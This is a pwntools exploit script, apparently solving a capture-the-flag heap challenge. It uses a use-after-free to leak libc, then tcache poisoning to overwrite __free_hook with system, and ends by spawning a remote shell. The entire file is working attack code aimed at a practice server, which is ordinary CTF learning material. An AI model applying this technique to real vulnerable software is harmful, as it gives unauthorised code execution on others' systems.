from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

# sh = process(["./vuln"])
sh = remote("week-1.hgame.lwsec.cn", 30554)
elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")
# libc = ELF("/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")


def add(idx: int, size: int):
    sh.sendlineafter(b'5. Exit', b'1')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendlineafter(b'Size: ', str(size).encode())


def delete(idx: int):
    sh.sendlineafter(b'5. Exit', b'2')
    sh.sendlineafter(b'Index: ', str(idx).encode())


def edit(idx: int, content: bytes):
    sh.sendlineafter(b'5. Exit', b'3')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendafter(b'Content: ', content)


def show(idx: int):
    sh.sendlineafter(b'5. Exit', b'4')
    sh.sendlineafter(b'Index: ', str(idx).encode())


for i in range(8):
    add(i, 0x80)
for i in range(7):
    delete(i)

add(8, 0x10)
delete(7)
show(7)

libc_base = u64(sh.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - 0x1ecbe0
free_hook_addr = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']
print(hex(free_hook_addr))
edit(6, p64(free_hook_addr))
print(hex(libc_base))

# gdb.attach(sh, 'p/x $rebase(0x4060)\n')
# pause()
add(9, 0x80)
add(10, 0x80)
edit(10, p64(system_addr))
add(11, 0x10)
edit(11, '/bin/sh\x00')
delete(11)

sh.interactive()